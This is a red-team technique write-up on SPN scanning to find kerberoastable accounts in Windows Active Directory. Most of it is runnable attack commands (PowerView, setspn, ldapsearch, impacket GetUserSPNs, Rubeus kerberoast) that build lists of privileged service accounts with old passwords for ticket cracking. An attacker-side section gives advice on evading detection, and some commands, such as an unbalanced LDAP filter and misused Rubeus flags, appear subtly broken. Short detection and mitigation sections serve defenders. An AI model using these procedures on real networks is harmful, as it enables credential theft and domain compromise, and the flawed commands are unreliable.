# REC-AD-004: SPN Scanning for Kerberoastable Accounts

**SERVTEP ID:** REC-AD-004  
**Technique Name:** SPN scanning for kerberoastable accounts  
**MITRE ATT&CK Mapping:** T1087.002 (Account Discovery - Domain Account)  
**CVE Reference:** N/A  
**Environment:** Windows Active Directory  
**Severity:** Critical  
**Difficulty:** Easy  

---

## Executive Summary

Service Principal Name (SPN) scanning identifies Active Directory user accounts and computer objects configured with SPNs (services registered in the domain). Attackers scan for SPNs to identify kerberoastable accounts—user accounts with weak passwords that can be compromised through offline brute-force attacks against Kerberos tickets. This reconnaissance technique is fundamental to privilege escalation, as SPN-enabled accounts often represent service accounts with elevated privileges that haven't been rotated in years.

---

## Objective

Identify and enumerate Service Principal Names to:
- Locate kerberoastable accounts (vulnerable to Kerberoasting)
- Identify service accounts with elevated privileges
- Map domain services and their associated credentials
- Find accounts with weak password policies
- Identify delegation-enabled accounts (constrained/unconstrained)
- Discover Exchange servers and other critical services
- Find accounts susceptible to AS-REP roasting (pre-auth disabled)

---

## Prerequisites

- Network connectivity to Active Directory domain controller
- LDAP query capability (port 389)
- SPN enumeration tools (setspn, GetUserSPNs, PowerView, etc.)
- Active Directory user credentials (optional for some tools)
- Knowledge of domain name

---

## Execution Procedures

### Method 1: LDAP SPN Enumeration via PowerShell

**Step 1:** Query all SPNs in domain
```powershell
# Import PowerView (or use built-in methods)
. .\PowerView.ps1

# Get all users with SPNs
Get-NetUser -SPN | Select-Object samAccountName, servicePrincipalName, userAccountControl

# Get all computers with SPNs
Get-NetComputer -SPN | Select-Object samAccountName, servicePrincipalName

# Filter for kerberoastable accounts (not computer accounts)
Get-NetUser -SPN | 
  Where-Object {$_.samAccountName -notmatch "\\$$"} |
  Select-Object samAccountName, servicePrincipalName
```

**Step 2:** Identify service accounts by naming convention
```powershell
# Find accounts starting with 'svc' or 'service'
Get-NetUser -Filter "(|(name=svc*)(name=service*))" |
  Select-Object samAccountName, displayName, userAccountControl

# Find Exchange service accounts
Get-NetUser -SPN | Where-Object {$_.servicePrincipalName -like "*exchangeMDB*"}

# Find accounts with 'admin' in name (higher privilege)
Get-NetUser | Where-Object {$_.samAccountName -like "*admin*"}
```

**Step 3:** Export for further analysis
```powershell
# Export all SPNs to file
$spns = Get-NetUser -SPN
$spns | Select-Object samAccountName, servicePrincipalName | Export-Csv spns.csv

# Count SPNs by service type
$spns | ForEach-Object {
  $_.servicePrincipalName -split '/' | Select-Object -First 1
} | Group-Object | Select-Object Name, Count
```

### Method 2: Using SetSPN Tool (Built-in Windows)

**Step 1:** List SPNs for entire domain
```cmd
REM List all registered SPNs in domain
setspn -T example.com -F -Q */*

REM Export to file
setspn -T example.com -F -Q */ > spns.txt

REM Filter output
findstr /I "http ldap mssql exchange" spns.txt
```

**Step 2:** Query specific SPN types
```cmd
REM Find HTTP/HTTPS services (web apps, Exchange)
setspn -T example.com -F -Q HTTP/*
setspn -T example.com -F -Q HTTPS/*

REM Find MSSQL services
setspn -T example.com -F -Q MSSQL/*

REM Find LDAP services
setspn -T example.com -F -Q LDAP/*
```

### Method 3: LDAP Query for SPN Enumeration

**Step 1:** Direct LDAP query for SPNs
```bash
# Query all users with servicePrincipalName attribute
ldapsearch -h <dc-ip> -p 389 -x -b "DC=example,DC=com" \
  "(servicePrincipalName=*)" sAMAccountName servicePrincipalName userAccountControl

# Filter for enabled accounts only
ldapsearch -h <dc-ip> -p 389 -x -b "DC=example,DC=com" \
  "(&(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2))))" \
  sAMAccountName servicePrincipalName

# Grep for specific services
ldapsearch -h <dc-ip> -p 389 -x -b "DC=example,DC=com" \
  "(servicePrincipalName=HTTP/*)" | grep -E "^(sAMAccountName|servicePrincipalName):"
```

**Step 2:** Export LDAP results for analysis
```bash
# Full dump of all SPNs with attributes
ldapsearch -h <dc-ip> -p 389 -x -b "DC=example,DC=com" \
  "(servicePrincipalName=*)" sAMAccountName servicePrincipalName \
  pwdLastSet lastLogonTimestamp > spn_dump.ldif
```

### Method 4: Python-Based SPN Enumeration

**Step 1:** Using impacket GetUserSPNs
```bash
# List all SPNs (requires valid domain credentials)
python3 GetUserSPNs.py -dc-ip 192.168.1.100 example.com/user:password

# Export to file for processing
python3 GetUserSPNs.py -dc-ip 192.168.1.100 -output-file spns.txt \
  example.com/user:password

# Filter for specific SPNs
python3 GetUserSPNs.py -dc-ip 192.168.1.100 example.com/user:password | \
  grep -i "HTTP\|MSSQL\|LDAP"
```

**Step 2:** Analyze SPN output
```bash
# Extract usernames and SPNs
grep -E "UserName:|ServicePrincipalName:" spns.txt > spn_users.txt

# Count SPN types
cut -d'/' -f1 spn_users.txt | sort | uniq -c | sort -rn
```

### Method 5: Advanced LDAP Filtering for Kerberoastable Accounts

**Step 1:** Identify accounts vulnerable to Kerberoasting
```powershell
# PowerView method: Find SPNs where user doesn't have "Account Disabled" flag
Get-NetUser -SPN | 
  Where-Object {-not ($_.userAccountControl -band 0x0002)} |
  Select-Object samAccountName, servicePrincipalName, pwdLastSet

# Identify accounts not requiring strong authentication
Get-NetUser -SPN |
  Where-Object {($_.userAccountControl -band 0x400000) -eq 0} |
  Where-Object {-not ($_.userAccountControl -band 0x0002)}
```

**Step 2:** Find accounts with old passwords (high crack probability)
```powershell
$cutoffDate = (Get-Date).AddDays(-365)

Get-NetUser -SPN |
  Where-Object {$_.pwdLastSet -lt $cutoffDate} |
  Select-Object samAccountName, servicePrincipalName, pwdLastSet

# Export old-password accounts
$oldSpns = Get-NetUser -SPN | 
  Where-Object {$_.pwdLastSet -lt $cutoffDate}

$oldSpns | Export-Csv kerberoast_targets.csv -NoTypeInformation
```

**Step 3:** Identify high-value targets
```powershell
# Find Exchange servers (high value targets)
Get-NetUser -SPN | 
  Where-Object {$_.servicePrincipalName -like "*exchangeMDB*" -or 
                $_.servicePrincipalName -like "*exchangeRFR*"}

# Find MSSQL services (database access)
Get-NetUser -SPN |
  Where-Object {$_.servicePrincipalName -like "MSSQL/*"}

# Find accounts in privileged groups
Get-NetUser -SPN | 
  Where-Object {Get-NetGroupMember -GroupName "Domain Admins" | 
                Select-Object -ExpandProperty memberName | 
                Select-String $_.samAccountName}
```

### Method 6: Automated SPN Enumeration and Kerberoasting

**Step 1:** Full enumeration with filtering
```powershell
# Complete SPN discovery script
$spns = Get-NetUser -SPN |
  Where-Object {-not ($_.userAccountControl -band 0x0002)} # Enabled only

# Categorize by service type
$httpSpns = $spns | Where-Object {$_.servicePrincipalName -like "HTTP/*"}
$sqlSpns = $spns | Where-Object {$_.servicePrincipalName -like "MSSQL/*"}
$ldapSpns = $spns | Where-Object {$_.servicePrincipalName -like "LDAP/*"}

Write-Host "HTTP Services: $($httpSpns.count)"
Write-Host "MSSQL Services: $($sqlSpns.count)"
Write-Host "LDAP Services: $($ldapSpns.count)"

# Export by category
$httpSpns | Export-Csv http_targets.csv
$sqlSpns | Export-Csv sql_targets.csv
$ldapSpns | Export-Csv ldap_targets.csv
```

**Step 2:** Prepare for Kerberoasting
```powershell
# Get Kerberos tickets for all SPN accounts (requires Rubeus or Invoke-Kerberoast)
$spnAccounts = Get-NetUser -SPN | 
  Where-Object {-not ($_.userAccountControl -band 0x0002)}

# Export account list for Kerberoast
$spnAccounts | Select-Object samAccountName, servicePrincipalName | 
  Export-Csv kerberoast_list.csv

# Alternative: Use Rubeus to get tickets
.\Rubeus.exe kerberoast /nopreauth /outfile spn_tickets.kirbi
```

---

## Technical Deep Dive

### Service Principal Name Format

SPNs follow format: `service/host:port/service_instance`

**Common SPN Types:**
- `HTTP/*` - Web applications, IIS
- `MSSQL/*` - SQL Server databases
- `LDAP/*` - Directory services
- `exchangeMDB/*` - Exchange mailbox databases
- `exchangeRFR/*` - Exchange availability service
- `CIFS/*` - File shares, SMB
- `HOST/*` - Generic services
- `KADMIN/*` - Kerberos admin

### Kerberoastable Account Characteristics

| Attribute | Value | Exploitability |
|-----------|-------|-----------------|
| Has SPN | Yes | High |
| Enabled | True | High |
| Password age | >365 days | Very High |
| In Admin groups | Yes | Critical |
| Pre-auth required | No | Very High |
| Delegation enabled | Yes | Critical |

---

## Detection Strategies (Blue Team)

### SPN Query Detection

1. **Event ID 4661: Object Access**
   - Alert on servicePrincipalName attribute access
   - Monitor for bulk SPN queries
   - Track LDAP query patterns

2. **LDAP Monitoring**
   - Excessive LDAP searches for "(servicePrincipalName=*)"
   - Setspn.exe execution on non-admin systems
   - GetUserSPNs.py execution

3. **Network-Based Detection**
   - Monitor LDAP port 389 for enumeration patterns
   - Alert on LDAP query spikes
   - Track repeated query patterns

### Behavioral Indicators

```
High Severity Alert Triggers:
- LDAP query with filter: "(servicePrincipalName=*)"
- Setspn -T <domain> -F -Q */
- Multiple GetUserSPNs executions
- PowerShell Get-NetUser -SPN commands
```

---

## Operational Security (OpSec) Considerations

### Attacker Perspective

1. **Stealth Enumeration**
   - Use legitimate LDAP tools (setspn, dsquery)
   - Avoid specialized tools (Rubeus, Invoke-Kerberoast)
   - Query SPNs during normal business hours
   - Use existing domain credentials

2. **Timing & Distribution**
   - Space LDAP queries across multiple days
   - Query small subsets instead of entire domain
   - Mix SPN queries with other legitimate queries

### Defensive Measures

1. **Restrict SPN Access**
   - Monitor servicePrincipalName attribute access
   - Limit LDAP query logging to high-risk attributes
   - Alert on unusual LDAP patterns

2. **SPN Management**
   - Regularly audit and cleanup unused SPNs
   - Enforce strong password policies for service accounts
   - Rotate service account passwords annually

---

## Mitigation Strategies

1. **Immediate Actions**
   - Identify all SPNs in domain
   - Review service account password ages
   - Disable unused SPNs

2. **Detection & Response**
   - Enable LDAP diagnostic logging
   - Monitor for SPN enumeration attempts
   - Alert on LDAP query anomalies

3. **Long-term Security**
   - Implement Managed Service Accounts (MSA) or Group Managed Service Accounts (gMSA)
   - Enforce strong password policies for service accounts
   - Use Kerberos pre-authentication enforcement
   - Regular SPN security audits

---

## References & Further Reading

- [Kerberoasting - MITRE ATT&CK T1558.003](https://attack.mitre.org/techniques/T1558/003/)
- [Service Principal Name (SPN)](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names)
- [SetSPN Tool Reference](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2/cc731241(v=ws.11))
- [Active Directory Service Accounts Security](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-service-accounts)

---

## Related SERVTEP Techniques

- **REC-AD-001**: Tenant Discovery (prerequisite)
- **REC-AD-002**: Anonymous LDAP (alternative enumeration)
- **REC-AD-003**: PowerView (comprehensive AD enumeration)
- **CA-KERB-001**: Kerberoasting (exploitation of SPN accounts)
- **CA-KERB-002**: AS-REP roasting (related technique)

---

## Timeline

| Phase | Duration | Difficulty |
|-------|----------|------------|
| SPN enumeration | 1-3 minutes | Easy |
| Account filtering | 1-2 minutes | Easy |
| Target analysis | 2-5 minutes | Medium |
| Kerberoasting prep | 2-5 minutes | Medium |
| **Total** | **6-15 minutes** | **Easy** |

---

**Last Updated:** December 2025  
**Classification:** SERVTEP Research Division  
**Status:** Verified & Operational
